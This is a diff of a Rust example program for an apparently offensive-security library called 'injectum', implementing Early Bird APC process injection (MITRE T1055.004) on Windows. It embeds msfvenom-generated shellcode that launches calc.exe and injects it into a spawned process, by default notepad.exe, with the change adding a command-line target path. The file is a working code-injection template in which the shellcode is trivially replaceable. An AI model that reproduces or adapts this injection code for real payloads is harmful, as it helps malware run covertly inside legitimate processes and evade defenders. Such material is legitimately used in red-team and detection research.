@@ -1,41 +1,43 @@
 //! Example: T1055.004 - Early Bird Injection
 //!
-//! ## Requirements
-//! - **Operating System**: Windows
-//! - **Features**: This example requires the `T1055_004` feature to be enabled.
-//!
-//! ## Build
-//! You can build this example with the following command:
+//! Build:
 //! ```sh
 //! cargo build --package injectum --example T1055_004_Early_Bird --features "tracing,T1055_004" --release
 //! ```
 //!
-//! ## Usage
+//! Usage:
 //! ```sh
-//! ./T1055_004_Early_Bird.exe
+//! ./T1055_004_Early_Bird.exe [TARGET_PATH]
 //! ```
-
-use injectum::{
-    InjectorBuilder, InjectumError, Payload, PayloadMetadata, StrategyType, Target, Technique,
-};
-
-#[cfg(feature = "tracing")]
-use tracing::{error, info};
+//!
+//! If TARGET_PATH is missing, defaults to 'notepad.exe'.
 
 #[cfg(not(feature = "tracing"))]
 mod logs {
     #[macro_export]
-    macro_rules! info {
-        ($($arg:tt)*) => {};
+    macro_rules! error {
+        ($($arg:tt)*) => {
+            let _ = format_args!($($arg)*);
+        };
     }
     #[macro_export]
-    macro_rules! error {
-        ($($arg:tt)*) => {};
+    macro_rules! info {
+        ($($arg:tt)*) => {
+            let _ = format_args!($($arg)*);
+        };
     }
 }
 
+use injectum::{
+    InjectorBuilder, Payload, PayloadMetadata, Result, Target, Technique,
+    method::AsynchronousProcedureCall,
+};
+use std::{env::args, path::PathBuf};
+#[cfg(feature = "tracing")]
+use tracing::{error, info};
+
+// Don't trust me, generate your own payloads!
 // msfvenom -p windows/x64/exec CMD=calc.exe -f rust
-// But don't trust me, generate your payload! :)
 const SHELLCODE: &[u8] = &[
     0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
     0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
@@ -57,56 +59,57 @@ const SHELLCODE: &[u8] = &[
     0x65, 0x78, 0x65, 0x00,
 ];
 
-/// Program entry point.
 fn main() {
     if let Err(e) = run() {
         error!("{}", e);
     }
 }
 
-/// Orchestrates the injection workflow.
-fn run() -> Result<(), InjectumError> {
+fn run() -> Result<()> {
     setup_logging();
-
+    let target_path = parse_args();
     info!("------------------------------------------------");
-    info!("Target Process    : Self-Spawned (cmd.exe)");
-    info!("Shellcode Source  : Embedded Static Bytes");
+    info!("Target Process    : Spawning {:?}", target_path);
     info!("Technique         : T1055.004 (EarlyBird)");
     info!("------------------------------------------------");
-
-    inject_shellcode()?;
-
-    info!("Injection completed successfully.");
+    inject_shellcode(target_path)?;
+    info!("Injection completed.");
     Ok(())
 }
 
 /// Performs the Shellcode injection using Injectum.
-fn inject_shellcode() -> Result<(), InjectumError> {
+fn inject_shellcode(target_path: PathBuf) -> Result<()> {
     let payload = Payload::Shellcode {
         bytes: SHELLCODE.to_vec(),
-        meta: PayloadMetadata {
-            description: Some("Embedded Example Shellcode".into()),
-            safe_sample: true,
-            ..Default::default()
-        },
+        metadata: PayloadMetadata::default(),
     };
-
-    let strategy = StrategyType::new(Technique::T1055_004, Some("EarlyBird"));
-
+    let technique = Technique::T1055_004(AsynchronousProcedureCall::EarlyBird);
     InjectorBuilder::new()
-        .target(Target::None) // Early Bird spawns its own process, so we use Target::None
-        .strategy(strategy)
+        .target(Target::Spawn(target_path))
+        .technique(technique)
         .payload(payload)
         .execute()
+}
+
+fn parse_args() -> PathBuf {
+    let cli_args: Vec<String> = args().collect();
+    if cli_args.len() > 1 {
+        PathBuf::from(&cli_args[1])
+    } else {
+        PathBuf::from("C:\\Windows\\System32\\notepad.exe")
+    }
 }
 
 fn setup_logging() {
     #[cfg(feature = "tracing")]
     {
-        // Initialize logging with a default of "info" if RUST_LOG is not set
-        let filter = tracing_subscriber::EnvFilter::try_from_default_env()
-            .unwrap_or_else(|_| tracing_subscriber::EnvFilter::new("info"));
-
-        let _ = tracing_subscriber::fmt().with_env_filter(filter).try_init();
+        use tracing_subscriber::EnvFilter;
+        let _ = tracing_subscriber::fmt()
+            .with_target(true)
+            .with_env_filter(
+                EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("info")),
+            )
+            .without_time()
+            .try_init();
     }
 }
